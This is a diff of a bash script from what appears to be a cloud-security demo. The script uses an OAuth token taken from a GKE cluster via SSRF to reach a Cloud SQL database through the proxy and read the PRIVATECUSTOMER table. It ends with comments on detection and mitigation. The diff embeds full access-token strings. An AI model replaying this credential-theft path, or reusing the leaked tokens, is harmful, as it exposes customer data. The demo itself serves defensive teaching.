@@ -1,19 +1,17 @@
 #!/bin/bash
 
-# This is a similar demo, where we use the stolen token to access the Cloud SQL database and read the data.
-export PROJECT_ID='xxxxx'
-export SQL_DATABASE_ID='storm-cloud-sqldb'
-export SQL_INSTANCE_ID='storm-cloud-sql'
+# We assume that the attacker has recon'd the below 3 params. Very likely by reading pod $env
+#export PROJECT_ID='xxxxx'
+#export SQL_DATABASE_ID='storm-cloud-sqldb'
+#export SQL_INSTANCE_ID='storm-cloud-sql'
 
 # we need to again grab the OAuth2 token via the SSRF (Server Side Request Forgery) attack from the GKE cluster
-export OAUTH_TOKEN="ya29.c.c0ASRK0GZbIzvXGJ_kbJJKbnGkMCSiZrGskDr8aAet8A_NVwK9I92GnTcO9HC-oSJrOoPUiUCZOaPADoz_aKbLgbcscJVW07YbARjl3_-7xPxAxJTCRE3Kfp2bqH9_lzIGy9hQvQ3-fOhitrNMCaL1ITwdm3XQJ1odLE5WxJprAuJK366VSV6CPrJmdLCtCOQPNXISNwHPUXsnAuhSR7NZl1as_kpqQ9D22mw8yupsSXo-6T2BmSaeAQX5QqS6hFbj-y_qfoLCAUdDmO1qWYxwTI_qIi3OaOCnLqqOtkEfjMgBOaKvw3Ekoms2V97jxIUenk68_sz_HA97kJsFgLnYbuuf-Vq64xqhY88HK_8I-e0ILs5o1oi3gXUkjoqfOyrSRCAigkIEE1Yra9tW8QO7KsFe2_sAb90D-1hwFixs2NiKzA_dIfAXuHlFojyd3UyyEh90K2q--HlOiXwGvCD4rR0rwbXV5LaEmK9nWv44bDFVG7s-sYg7t1Zi1amcnKbbM8d-Pvc7ZA6fzaF8_a2NvS8ZN_EfsRYJNN8ncq9aBxfpBIsAiheYkJEkN8A0paApc_GCmw0EXLKpT25lFPqkuHvxd4BUH7-8fqqJxC5GSclFdO077uZ1L637PpqWixO1MmFbQO6zpYwcQyMcFeUJnFaMXvQVeRbZwIzV43oYbdZhrVuBFbBtyIU-zokJJWqk_5qwISyzaUw8eFUavp1WbkwVJX8p9i3krRtlyRuQj42Ibju8y3xF572otV9FF37IVFrqr2aorfMz0tnW3fm2urU0u4tl7RhprItUhQxWj3i8X1vMXu7mM5fQj07zBhRQx5hf8jYxrJMka03dSOQ-U7YxioXvR_aSS74fRbb3nIp_RS0bpbii0hu2Xm21zByb_MyJmBfmvr9Yz31IX7-zI6v8qqzB_dW6Xog-gRrdYlMd9bs7_XyQ1ru1ejjXSi4qtV3_wyibbs_yoegatRgO4MS9yr4xR_c8JVau9F27XWZgUr-nfzpf_bX"
-
-# Use the offical GCP PROXY to tunnel to the SQL_DB:  https://cloud.google.com/sql/docs/postgres/connect-auth-proxy#docker-unix
+#export TOKEN="ya29.c.c0ASRK0GZ3WU7XlEk7UJJcELmnCyaSXk7y1pAmkF_brtdWTyEhnbSO9e68pphuMbjNHZ0dJqlPR_dzshfFZFFBDpQ2yGQ0zY8wOEscToYiM1cxxRDhCXF_kdv51aIdoJuGu4MG5Jx1VbDCw-_8aXKCEaDaYUzH76_pJkpZ82S4YpEZJNHq2hsBbo_-p-sIEZtgamSElQH5SIuAVVQ0uD_zNEpIsQTasPHkHnL-ishdQStSNKwCaSgWJOBrCOW-LJnV_CCOj4AobYWYLTUXRPrLrWKJ_fEPWqAnGSYYU1B6guusEe48utsql1pNsZ97RlOCVMarxuTmtLU7t_yNhTtXsmr0PzGmjiFGnkbwps8qtDxd8JXKqGiFQhxTnDior-jLpMuyR7UzL6FIHY6ovRb5XVQhyofDwjs9MhDfVxW1ZVgRhbDUrjaXNZcFrElSdxIoDFQshGjg6T3VBJ0p_D5DjezxjssyRTT_4fK80GUvvOWwB95H5ByDoCxJHPPs6ruyzBeNsUcqdqid9Hwc51VcuQ8sbdl9V3mnreYVNYnJ0f_Qt3PC9j_9XMxcoYpIS8ENaTDReChIBMeXh20uMoT3YoCJCncWZYuje7zkkbEeLXv7Gbq02-BdN637DO2bqYgqUulcfnkt0uoimsXw4_w3UYX2XwB2i185_mq2Xuq0JW4cs7eh-56IkgrnankWZvrdzzFle6ciXOaoB7aMu0dvwt--wUaZtYSgtdF29y_BoOhzh7n6zzbXb3UgWj3yx0nZauxcSp29b9g5pryFzRJqaqhIp1x0hYX1w9OnsO7gFYsrmi7F8SuhQwu1Mr1wZhchIBFr9Wkbnqmw9u3_gI4IgMU02IZhfB3BIBhjhbR_9s16BjzBrhseBRwXR958vze4hSoYrtI3Fz_vt5a4uBy_XOw5qIdY5Mm3iW6Z8brR_bbMFl5WB4gFz1iII1c3eetsx4vlgmIbVc0UoFdm6OR1yzrxivew4wjFkcXh17fISYpS22BcVvRbbZ-" Use the offical GCP PROXY to tunnel to the SQL_DB:  https://cloud.google.com/sql/docs/postgres/connect-auth-proxy#docker-unix
 #curl -o cloud-sql-proxy https://storage.googleapis.com/cloud-sql-connectors/cloud-sql-proxy/v2.13.0/cloud-sql-proxy.darwin.arm64
 #chmod +x cloud-sql-proxy
 # Now we can use the OAUTH_TOKEN as Bearer to read the Data 
-./cloud-sql-proxy --token ${OAUTH_TOKEN} ${PROJECT_ID}:europe-west1:${SQL_INSTANCE_ID}
-PGPASSWORD=${OAUTH_TOKEN} psql "sslmode=disable host=127.0.0.1 port=5432 user=pacman-rancher@${PROJECT_ID}.iam dbname=${SQL_DATABASE_ID}"
+./cloud-sql-proxy --token ${TOKEN} ${PROJECT_ID}:europe-west1:${SQL_INSTANCE_ID}
+PGPASSWORD=${TOKEN} psql "sslmode=disable host=127.0.0.1 port=5432 user=pacman-rancher@${PROJECT_ID}.iam dbname=${SQL_DATABASE_ID}"
   
 SELECT * from PRIVATECUSTOMER;
 
@@ -27,7 +25,6 @@ SELECT * from PRIVATECUSTOMER;
 # Having audit logs on the database and metadata-api-server logs for correlation is required for 100% true positive breach detection.
 # Another good idea is to limit the use of federated identity in general to only services that need passwords
 # A more elaborate mitigation is to use SPIFFE (Secure Production Identity Framework For Everyone) to ensure that the identity of the pod is unique and a stolen token can only be used by the pod that it was minted for.
-
 
 
 
